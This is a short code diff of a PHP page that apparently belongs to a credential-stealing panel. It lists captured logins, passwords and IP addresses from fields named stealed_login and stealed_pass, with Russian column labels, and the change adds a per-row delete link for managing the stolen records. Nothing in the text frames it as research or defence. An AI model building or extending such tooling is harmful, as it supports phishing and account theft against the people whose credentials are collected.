@@ -15,6 +15,7 @@ $data = $stmt->fetchall(\PDO::FETCH_ASSOC);
 
 $id = $data[0]['id'];
 
+
 ?>
 
 
@@ -35,12 +36,15 @@ $id = $data[0]['id'];
             <td>Пароль</td>
             <td>IP</td>
         </tr>
-        <?php if(isset($data[0])): ?>
+        <?php if(isset($data[0]['steal_id'])): ?>
             <?php foreach($data as $d): ?>
                 <tr>
                     <td><?= $d['stealed_login'] ?></td>
                     <td><?= $d['stealed_pass'] ?></td>
                     <td><?= $d['ip'] ?></td>
+                    <td>
+                        <a href="<?= Controller::url('delete') . "?id=" . $d['steal_id'] ?>">Удалить</a>
+                    </td>
             <?php endforeach; ?>
         <?php endif; ?>
         </tr>
